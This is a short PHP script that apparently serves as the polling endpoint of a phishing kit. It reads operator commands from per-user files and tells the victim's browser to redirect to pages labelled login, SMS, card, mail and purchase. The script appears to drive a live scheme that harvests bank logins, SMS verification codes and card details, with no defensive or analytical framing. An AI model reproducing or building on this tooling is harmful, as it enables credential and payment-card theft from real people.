<?php
session_set_cookie_params(['lifetime'=>0,'path'=>'/','domain'=>'','secure'=>true,'httponly'=>true,'samesite'=>'None']); session_start();
if (empty($_SESSION['gate_pass'])) { http_response_code(403); echo json_encode(['ok'=>false,'error'=>'unauthorized']); exit; }
$u = $_SESSION['usuario'] ?? null;

if (!$u) {
    echo json_encode(['action' => null]);
    exit;
}

$ar = "acciones/$u.txt";
if (file_exists($ar)) {
    $ac = trim(file_get_contents($ar));
    unlink($ar);
    
    // Mapear acciones a respuestas esperadas
    switch ($ac) {
        case "/LISTO":
            echo json_encode(['action' => 'redirect_listo']);
            break;
        case "/COMPRA":
            echo json_encode(['action' => 'redirect_compra']);
            break;
        case "/LOGIN":
            echo json_encode(['action' => 'redirect_login']);
            break;
        case "/SMS":
            echo json_encode(['action' => 'redirect_sms']);
            break;
        case "/CARD":
            echo json_encode(['action' => 'redirect_card']);
            break;
        case "/MAIL":
            echo json_encode(['action' => 'redirect_mail']);
            break;
        default:
            echo json_encode(['action' => null]);
            break;
    }
} else {
    echo json_encode(['action' => null]);
}
?>